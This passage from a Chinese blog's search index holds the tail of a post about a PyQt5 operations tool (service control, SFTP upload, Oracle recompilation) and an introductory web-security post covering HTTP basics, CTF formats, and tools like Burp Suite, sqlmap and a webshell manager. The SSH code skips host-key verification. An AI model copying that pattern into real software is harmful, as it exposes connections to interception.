title="服务状态"></a>服务状态</h3><blockquote><p>应用服务运行整体情况（应用服务启、停、服务状态、查看运行日志）</p></blockquote><p>应用服务管理是我最初设想完成的目标，之前通过TKinker实现了基本功能但是由于UI假死的不友好性被我无情抛弃，Pyqt的信号槽机制非常灵活，简单的理解就是利用事件绑定传递信号，通过信号槽接收信号处理信息。应用列表内容目前也都是代码写死的，不过改成配置文件形式加载也并不是什么难事，这样做的好处也是能够具有更好的工具通用性即使在其他环境下也能够管理服务。</p><p><img src="http://106.52.86.96/202007281309/3.png" alt=""></p><p>简单实现代码如下：</p><pre class=" language-python"><code class="language-python">start_Btn<span class="token punctuation">.</span>clicked<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token keyword">lambda</span><span class="token punctuation">:</span> table_btn<span class="token punctuation">(</span>server_name<span class="token punctuation">,</span> port<span class="token punctuation">,</span> <span class="token string">"start"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#点击事件绑定执行函数</span></code></pre><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">up_list_single</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>                                          <span class="token comment" spellcheck="true">#定义启动单个服务线程启动函数</span>    self<span class="token punctuation">.</span>update_data_thread <span class="token operator">=</span> UpdateDataSingle<span class="token punctuation">(</span><span class="token punctuation">)</span>    self<span class="token punctuation">.</span>update_data_thread<span class="token punctuation">.</span>update_date_single<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>update_item_data_single<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 链接信号</span>    self<span class="token punctuation">.</span>update_data_thread<span class="token punctuation">.</span>license_judge_msg<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>License_judge<span class="token punctuation">)</span>             <span class="token comment" spellcheck="true"># 链接信号</span>    self<span class="token punctuation">.</span>update_data_thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">UpdateDataSingle</span><span class="token punctuation">(</span>QThread<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""更新单个数据类"""</span>    update_date_single <span class="token operator">=</span> pyqtSignal<span class="token punctuation">(</span>str<span class="token punctuation">,</span> str<span class="token punctuation">,</span> str<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># 接收信号  pyqt5 支持python3的str，没有Qstring</span>    license_judge_msg<span class="token operator">=</span>pyqtSignal<span class="token punctuation">(</span>str<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">global</span> server_name_update<span class="token punctuation">,</span> cmd_update<span class="token punctuation">,</span> server_name_port        app <span class="token operator">=</span> server_name_update        cmd <span class="token operator">=</span> cmd_update        port <span class="token operator">=</span> server_name_port        self<span class="token punctuation">.</span>update_date_single<span class="token punctuation">.</span>emit<span class="token punctuation">(</span>str<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token punctuation">,</span> server_name_port<span class="token punctuation">,</span> str<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">)</span>        Server_btn_Cmd<span class="token punctuation">(</span>app<span class="token punctuation">,</span> port<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>        <span class="token keyword">print</span> app<span class="token punctuation">,</span> port<span class="token punctuation">,</span> cmd        <span class="token keyword">if</span> cmd_update <span class="token operator">==</span> <span class="token string">'start'</span><span class="token punctuation">:</span>            <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> IsOpen<span class="token punctuation">(</span>int<span class="token punctuation">(</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'Running'</span><span class="token punctuation">:</span>                    pt_val <span class="token operator">=</span> app <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>port<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">' 应用启动完成'</span>                    self<span class="token punctuation">.</span>update_date_single<span class="token punctuation">.</span>emit<span class="token punctuation">(</span>str<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token punctuation">,</span> server_name_port<span class="token punctuation">,</span> <span class="token string">"success"</span><span class="token punctuation">)</span>                    print_ts<span class="token punctuation">(</span>pt_val<span class="token punctuation">)</span>                    update_lab_num<span class="token punctuation">(</span><span class="token punctuation">)</span>                    self<span class="token punctuation">.</span>license_judge_msg<span class="token punctuation">.</span>emit<span class="token punctuation">(</span>str<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><blockquote><p>针对不同类型应用服务环境部署进行一键式应用配置、应用数据库配置修改</p></blockquote><p>我之前所接触的环境部署工作，主要是虚机化环境下通过环境克隆快速复制出新环境，再通过执行编写好的Shell脚本对相应的配置项进行更改，更改的内容主要是包括应用IP地址这类参数，那么通过工具能够更快速的完成这一系列步骤。（当然这里我也非常想了解圈内其他同僚们对于一些环境部署搭建都会采用怎么样高效便捷的方式进行，欢迎留言交流~）</p><p><img src="http://106.52.86.96/202007281309/4.png" alt=""></p><p>简单示例如下：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#远程上传Shell文件</span><span class="token keyword">def</span> <span class="token function">ssh_upload</span><span class="token punctuation">(</span>fromPath<span class="token punctuation">,</span>toPath<span class="token punctuation">)</span><span class="token punctuation">:</span>    ssh <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>SSHClient<span class="token punctuation">(</span><span class="token punctuation">)</span>    ssh<span class="token punctuation">.</span>set_missing_host_key_policy<span class="token punctuation">(</span>paramiko<span class="token punctuation">.</span>AutoAddPolicy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    ssh<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>hostname<span class="token operator">=</span>ip<span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">22</span><span class="token punctuation">,</span> username<span class="token operator">=</span>user<span class="token punctuation">,</span> password<span class="token operator">=</span>pwd<span class="token punctuation">)</span>    sftp_client<span class="token operator">=</span>paramiko<span class="token punctuation">.</span>SFTPClient<span class="token punctuation">.</span>from_transport<span class="token punctuation">(</span>ssh<span class="token punctuation">.</span>get_transport<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        sftp_client<span class="token punctuation">.</span>put<span class="token punctuation">(</span>fromPath<span class="token punctuation">,</span> toPath<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception<span class="token punctuation">,</span>e<span class="token punctuation">:</span>        <span class="token keyword">print</span> str<span class="token punctuation">(</span>e<span class="token punctuation">)</span>        reply <span class="token operator">=</span> QMessageBox<span class="token punctuation">.</span>question<span class="token punctuation">(</span>main_W<span class="token punctuation">,</span> <span class="token string">'提示'</span><span class="token punctuation">,</span> <span class="token string">"文件上传更新失败！！"</span><span class="token punctuation">,</span> QMessageBox<span class="token punctuation">.</span>Ok<span class="token punctuation">)</span>       sftp_client<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    ssh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#Linux Shell脚本中最核心内容总结起来就是一句话 #巧用grep + sed的批量匹配修改</span>grep <span class="token string">"$VALUE"</span> <span class="token operator">-</span>rl <span class="token punctuation">.</span><span class="token operator">/</span><span class="token operator">|</span>xargs sed <span class="token operator">-</span>i <span class="token string">"s#$VALUE#$NEW_VLAUE#g"</span> #查找目标内容并替换<span class="token operator">~</span></code></pre><p>数据库环境虚机克隆后往往都会出现一些失效对象，那么就是需要手动再进行一次编译，工具也集成了这样的功能，简单实现方式如下：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#ORACLE数据库 使用cx_Oracle模块用与oracle数据库连接</span><span class="token keyword">class</span> <span class="token class-name">InvalidCommpile</span><span class="token punctuation">(</span>QThread<span class="token punctuation">)</span><span class="token punctuation">:</span>    invalid_commpile_date<span class="token operator">=</span>pyqtSignal<span class="token punctuation">(</span>list<span class="token punctuation">,</span>str<span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">#事件信号</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        invalid_object_sql<span class="token operator">=</span><span class="token triple-quoted-string string">'''            select owner,object_name,replace(object_type,'','') object_type,status from all_objects where status='INVALID'             '''</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            conn <span class="token operator">=</span> cx_Oracle<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">"用户名"</span><span class="token punctuation">,</span> <span class="token string">"密码"</span><span class="token punctuation">,</span> <span class="token string">"连接串"</span><span class="token punctuation">,</span>mode<span class="token operator">=</span>cx_Oracle<span class="token punctuation">.</span>SYSDBA<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#连接数据</span>        <span class="token keyword">except</span> cx_Oracle<span class="token punctuation">.</span>DatabaseError <span class="token keyword">as</span> e<span class="token punctuation">:</span>            print_ts<span class="token punctuation">(</span><span class="token string">"数据库连接异常"</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            cur <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>                   <span class="token comment" spellcheck="true">#数据游标</span>            cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>invalid_object_sql<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true">#执行查询</span>            result <span class="token operator">=</span> cur<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span>               <span class="token comment" spellcheck="true">#获取数据集</span>            <span class="token keyword">for</span> item <span class="token keyword">in</span> result<span class="token punctuation">:</span>                <span class="token keyword">if</span> item<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'INDEX'</span><span class="token punctuation">,</span><span class="token string">'VIEW'</span><span class="token punctuation">,</span><span class="token string">'PACKAGE BODY'</span><span class="token punctuation">,</span><span class="token string">'PROCEDURE'</span><span class="token punctuation">,</span><span class="token string">'TRIGGER'</span><span class="token punctuation">,</span><span class="token string">'FUNCTION'</span><span class="token punctuation">,</span><span class="token string">'TYPE'</span><span class="token punctuation">,</span><span class="token string">'PACKAGE'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                    owner<span class="token operator">=</span>str<span class="token punctuation">(</span>item<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                    object_name<span class="token operator">=</span>str<span class="token punctuation">(</span>item<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                    object_type<span class="token operator">=</span>str<span class="token punctuation">(</span>item<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                    sql_val <span class="token operator">=</span> <span class="token string">"alter"</span><span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span>object_type<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">'BODY'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">" "</span><span class="token operator">+</span>owner<span class="token operator">+</span><span class="token string">"."</span><span class="token operator">+</span>object_name<span class="token operator">+</span><span class="token string">" "</span><span class="token operator">+</span><span class="token string">"compile"</span>                              <span class="token keyword">try</span><span class="token punctuation">:</span>                        cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql_val<span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">#执行失效对象编译</span>                    <span class="token keyword">except</span> cx_Oracle<span class="token punctuation">.</span>DatabaseError <span class="token keyword">as</span> e<span class="token punctuation">:</span>                        log_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>time_val <span class="token operator">+</span> convert_val<span class="token punctuation">(</span>str<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            cur<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>            conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>自从自己学习Python掌握了一些工具开发的基本能力以后，发现其实还是有很多用武之地的，也陆陆续续制作了其他一些运维相关的日志采集工具、数据库版本备份工具、自动化取数平台、监控平台等等，代码写得肯定是不够好的，但是制定的基本目标功能都能够实现，无论是开发还是运维或者网络安全都还有很长的路要走。</p><ul><li>宁可做拼搏的失败者，也不要做安于现状的平凡人…….兄弟萌，冲鸭!</li></ul><p><img src="http://106.52.86.96/202007281309/cy1.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> 工具 </tag>
            
            <tag> Pyqt5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web网络基础</title>
      <link href="/2020/07/23/web-an-quan-ji-chu/"/>
      <url>/2020/07/23/web-an-quan-ji-chu/</url>
      
        <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>最近有幸能够参加某安全公司开展关于<code>网络安全</code>(运维安全、开发安全、网络攻防知识)为期20天培训课程，通过课程能够知悉常见网络攻击，攻击原理。对于日后自己开展安全管理工作以及自身技能的提高都非常有帮助，第一期主要关于Web安全攻击，必须做好总结记录下来  go  go  go  👍👍👍</p><h4 id="HTTP协议分析"><a href="#HTTP协议分析" class="headerlink" title="HTTP协议分析"></a>HTTP协议分析</h4><blockquote><p>Web服务中很基础也和重要的一点就是HTTP通讯。基础部分不能丢，要掌握原理必须再从基础开始挖坑~😏</p></blockquote><ul><li><strong>概述</strong></li></ul><p><code>HTTP</code> 协议(超文本传输协议HyperText Transfer Protocol)，它是基于TCP协议的应用层传输协议，简单来说就是客户端和服务端进行数据传输的一种规则。</p><blockquote><p><strong>注意：</strong>客户端与服务器的角色不是固定的，一端充当客户端，也可能在某次请求中充当服务器。这取决与请求的发起端。HTTP协议属于应用层，建立在传输层协议TCP之上。客户端通过与服务器建立TCP连接，之后发送HTTP请求与接收HTTP响应都是通过访问Socket接口来调用TCP协议实现。</p></blockquote><p><code>HTTP</code> 是一种<strong>无状态</strong> (stateless) 协议, <code>HTTP</code>协议本身不会对发送过的请求和相应的通信状态进行持久化处理。这样做的目的是为了保持HTTP协议的简单性，从而能够快速处理大量的事务, 提高效率。</p><p>然而，在许多应用场景中，我们需要保持用户登录的状态或记录用户购物车中的商品。由于<code>HTTP</code>是无状态协议，所以必须引入一些技术来记录管理状态，例如<code>Cookie</code>。</p><hr><ul><li><strong>URL</strong></li></ul><p><code>HTTP URL</code> 包含了用于查找某个资源的详细信息, 格式如下：</p><pre><code>http://host[&quot;:&quot;port][abs_path]</code></pre><hr><ul><li><p><strong>请求（Request）</strong></p><p><code>HTTP</code>请求由三部分构成: 请求行 请求头 请求正文</p></li></ul><p><img src="http://106.52.86.96/202007030805/2905385-d3d809845229a31b.png" alt=""></p><p><img src="http://106.52.86.96/202007030805/image-20200718153834398.png" alt=""></p><blockquote><p>①是请求方法，<strong>GET</strong>和<strong>POST</strong>是最常见的HTTP方法，除此以外还包括DELETE、HEAD、OPTIONS、PUT、TRACE。不过，当前的大多数浏览器只支持GET和POST<br> ②为请求对应的URL地址，它和报文头的Host属性组成完整的请求URL，③是协议名称及版本号。<br> ④是HTTP的报文头，报文头包含若干个属性，格式为“属性名:属性值”，服务端据此获取客户端的信息。<br> ⑤是报文体，它将一个页面表单中的组件值通过<strong>param1=value1&amp;param2=value2</strong>的键值对形式编码成一个格式化串，它承载多个请求参数的数据。不但报文体可以传递请求参数，请求也可以通过<strong>/chapter15/user.html? param1=value1&amp;param2=value2</strong>的方式传递请求参数。</p></blockquote><hr><p>常见的报文头的属性</p><blockquote><p><code>Content-Type</code>、<code>User-Agent</code> 都常用被用于模拟不同类型MIME、不太身份进行网络请求攻击包的篡改与替换。</p></blockquote><table><thead><tr><th align="left">字段</th><th align="left">说明</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left">Accept</td><td align="left">可接收的响应内容类型</td><td align="left">Accept:text/plain (文本类型)</td></tr><tr><td align="left">Accept-Charset</td><td align="left">可接收的字符集</td><td align="left">Accept-Charset: utf-8</td></tr><tr><td align="left">Accept-Encoding</td><td align="left">可接受的响应内容的编码方式</td><td align="left">Accept-Encoding: gzip, deflate</td></tr><tr><td align="left">Accept-Language</td><td align="left">可接受的响应内容语言列表</td><td align="left">Accept-Language: en-US</td></tr><tr><td align="left">Accept-Datetime</td><td align="left">可接受的按照时间来表示的响应内容版本</td><td align="left">Accept-Datetime: Sat, 26 Dec 2015 17:30:00 GMT</td></tr><tr><td align="left">Authorization</td><td align="left">HTTP协议中需要认证资源的认证信息</td><td align="left">Authorization: Basic OSdjJGRpbjpvcGVuIANlc2SdDE==</td></tr><tr><td align="left">Cache-Control</td><td align="left">请求/回复中的,是否使用缓存机制</td><td align="left">Cache-Control: no-cache</td></tr><tr><td align="left">Connection</td><td align="left">客户端想要优先使用的连接类型</td><td align="left">Connection: keep-alive Connection: Upgrade</td></tr><tr><td align="left">Content-Length</td><td align="left">以8进制表示的请求体的长度</td><td align="left">Content-Length: 348</td></tr><tr><td align="left"><strong>Content-Type</strong></td><td align="left">请求体的MIME类型</td><td align="left">Content-Type: application/x-www-form-urlencoded</td></tr><tr><td align="left">Date</td><td align="left">发送该消息的日期和时间</td><td align="left">Date: Dec, 26 Dec 2015 17:30:00 GMT</td></tr><tr><td align="left">Expect</td><td align="left">表示客户端要求服务器做出特定的行为</td><td align="left">Expect: 100-continue</td></tr><tr><td align="left">From</td><td align="left">发起此请求的用户的邮件地址</td><td align="left">From: <a href="mailto:user@itbilu.com">user@itbilu.com</a></td></tr><tr><td align="left">Host</td><td align="left">服务器域名和端口号,默认端口可省略</td><td align="left">Host: <a href="http://www.itbilu.com:80" target="_blank" rel="noopener">www.itbilu.com:80</a> or <a href="http://www.itbilu.com" target="_blank" rel="noopener">www.itbilu.com</a></td></tr><tr><td align="left">If-Match</td><td align="left">主要用于PUT,实体匹配才可以操作</td><td align="left">If-Match: “9jd00cdj34pss9ejqiw39d82f20d0ikd”</td></tr><tr><td align="left">If-Modified-Since</td><td align="left">资源未被修改的情况下返回304未修改</td><td align="left">If-Modified-Since: Dec, 26 Dec 2015 17:30:00 GMT</td></tr><tr><td align="left"><strong>User-Agent</strong></td><td align="left">浏览器的身份标识字符串</td><td align="left">User-Agent: Mozilla/</td></tr><tr><td align="left">Upgrade</td><td align="left">要求服务器升级到一个高版本协议</td><td align="left">Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11</td></tr><tr><td align="left">Via</td><td align="left">告诉服务器,这个请求是由哪个代理发出的</td><td align="left">Via: 1.0 fred, 1.1 itbilu.com.com (Apache/1.1)</td></tr><tr><td align="left">Referer</td><td align="left">表示跳转到当前页面的之前的页面</td><td align="left">Referer: <a href="http://itbilu.com/nodejs" target="_blank" rel="noopener">http://itbilu.com/nodejs</a></td></tr><tr><td align="left">Origin</td><td align="left">发起一个针对跨域资源共享的请求</td><td align="left">Origin: <a href="http://www.itbilu.com" target="_blank" rel="noopener">http://www.itbilu.com</a></td></tr></tbody></table><hr><ul><li><strong>响应(Response)</strong></li></ul><p>在接收到请求之后,服务器经过解释之后,会返回个一个HTTP响应<br><code>HTTP</code>响应是由四部分构成:状态行 响应头 空行 响应体</p><p><img src="http://106.52.86.96/202007030805/2905385-64cf3822d8ed347f.png" alt="2905385-64cf3822d8ed347f"></p><p><code>HTTP</code>响应的第一行都是状态行，依次是当前HTTP版本号，3位数字组成的状态代码，以及描述状态的短语，彼此由空格分隔。</p><p>状态代码的第一个数字代表当前响应的类型：</p><ul><li><p>1xx消息——请求已被服务器接收，继续处理</p></li><li><p>2xx成功——请求已成功被服务器接收、理解、并接受</p></li><li><p>3xx重定向——需要后续操作才能完成这一请求</p></li><li><p>4xx请求错误——请求含有词法错误或者无法被执行</p></li><li><p>5xx服务器错误——服务器在处理某个正确请求时发生错误</p></li></ul><hr><h4 id="CTF攻防比赛"><a href="#CTF攻防比赛" class="headerlink" title="CTF攻防比赛"></a>CTF攻防比赛</h4><blockquote><p>一直有所耳闻，但从未真正参与，希望未来有机会能打个最低级别的比赛。</p></blockquote><p>CTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式。CTF起源于1996年DEFCON全球黑客大会，以代替之前黑客们通过互相发起真实攻击进行技术比拼的方式。发展至今，已经成为全球范围网络安全圈流行的竞赛形式，2013年全球举办了超过五十场国际性CTF赛事。而DEFCON作为CTF赛制的发源地，DEFCON CTF也成为了目前全球最高技术水平和影响力的CTF竞赛，类似于CTF赛场中的“世界杯” 。</p><p>一、解题模式（Jeopardy）</p><p>在解题模式CTF赛制中，参赛队伍可以通过互联网或者现场网络参与，这种模式的CTF竞赛与ACM编程竞赛、信息学奥赛比较类似，以解决网络安全技术挑战题目的分值和时间来排名，通常用于在线选拔赛。题目主要包含逆向、漏洞挖掘与利用、Web渗透、密码、取证、隐写、安全编程等类别。</p><p>二、攻防模式（Attack-Defense）</p><p>在攻防模式CTF赛制中，参赛队伍在网络空间互相进行攻击和防守，挖掘网络服务漏洞并攻击对手服务来得分，修补自身服务漏洞进行防御来避免丢分。攻防模式CTF赛制可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负，是一种竞争激烈，具有很强观赏性和高度透明性的网络安全赛制。在这种赛制中，不仅仅是比参赛队员的智力和技术，也比体力（因为比赛一般都会持续48小时及以上），同时也比团队之间的分工配合与合作。 </p><p>三、混合模式（Mix）</p><p>结合了解题模式与攻防模式的CTF赛制，比如参赛队伍通过解题可以获取一些初始分数，然后通过攻防对抗进行得分增减的零和游戏，最终以得分高低分出胜负。采用混合模式CTF赛制的典型代表如iCTF国际CTF竞赛。</p><p>CTF常见题型：</p><p>Web网络攻防、REVERSE逆向工程、Pwn二进制漏洞利用、Crypto密码攻击、Misc安全杂项、Mobile移动安全。</p><ul><li><p>Reverse</p><p>题目涉及到软件逆向、破解技术等，要求有较强的反汇编、反编译功底。主要考查参赛选手的逆向分析能力，所需知识：汇编语言、加密与解密、常见反编译工具</p></li><li><p>Mobile</p><p>主要分为Android和IOS两个平台，以Android逆向为主，破解APK并提交正确答案。</p><p>所需知识：java、Android开发</p></li><li><p>Pwn</p><p>Pwn在黑客俚语中代表攻破，获取权限，在CTF比赛中它代表着溢出类的题目，其中常见的类型的溢出漏洞有整数溢出、栈溢出、堆溢出。主要考查参赛选手对漏洞的利用能力。</p><p>所需知识：C,OD+IDA(工具)、数据结构，操作系统</p></li><li><p>Crypto</p><p>题目考察各种加解密技术，包括古典加密技术、现代加密技术甚至出题者自创加密技术，以及一些常见的编码解码，考查参赛选手密码学相关知识点。</p><p>所需知识：矩阵、数论、密码学</p></li><li><p>Misc</p><p>Misc即安全杂项，题目涉及隐写术、流量分析、电子取证、人肉搜索、数据分析、大数据统计等覆盖面广，主要考查参赛选手各种基础综合知识。</p><p>所需知识：常见隐写术、Wireshark等流量审查工具、编码知识</p></li><li><p>Web</p><p>Web题目涉及到许多常见的Web漏洞，如XSS、文件包含、代码执行、上传漏洞、SQL注入等。也有一些关于网络基础知识的考察，如返回包、TCP/IP、数据包内容和构造。可以说题目环境比较接近真实环境。</p><p>所需知识：PHP、Python、TCP/IP、SQL</p></li></ul><hr><h4 id="Web安全常用工具及插件"><a href="#Web安全常用工具及插件" class="headerlink" title="Web安全常用工具及插件"></a>Web安全常用工具及插件</h4><blockquote><p>基本使用方法可以参考后面的靶场训练。</p></blockquote><ul><li><strong><code>Burp Suite</code></strong> 是用于攻击web 应用程序的集成平台，包含了许多工具。Burp Suite为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP 消息、持久性、认证、代理、日志、警报（<code>*必备工具</code>🔥）</li></ul><p><img src="http://106.52.86.96/202007030805/20200719194500.png" alt=""></p><ul><li><strong><code>中国蚁剑</code></strong>是一款开源的跨平台网站管理工具，它主要面向于合法授权的渗透测试安全人员以及进行常规操作的网站管理员。是一款非常优秀的<strong>WebShell</strong>管理工具。(与中国菜刀旗鼓相当，但是菜刀存在一定的漏洞后门，大家慎用!)</li></ul><p><img src="http://106.52.86.96/202007030805/20200719195336.png" alt=""></p><ul><li><p><strong><code>SqlMap</code></strong>是一个开源渗透测试工具，它可以自动检测和利用 SQL 注入漏洞并接管数据库服务器。它具有强大的检测引擎，同时有众多功能，包括数据库指纹识别、从数据库中获取数据、访问底层文件系统以及在操作系统上带内连接执行命令。(基于Python自动化实注入工具，功能是很强大，但是我也不会用~)</p></li><li><p><img src="http://106.52.86.96/202007030805/20200719200152.png" alt=""></p></li></ul><ul><li><p><code>**HackBar**</code>插件(网页渗透测试助手)是一款十分优秀好用的网络渗透测试辅助工具，使用后可以帮助用户更轻松便的进行网页渗透测试操作。几乎支持所有网址接口，有了它，我们可以轻松地进行拆分渗透分析操作。这个插件适合程序员，非常实用，可以大大提高用户的工作效率。</p><p><img src="http://106.52.86.96/202007030805/image-20200804003158812.png" alt=""></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
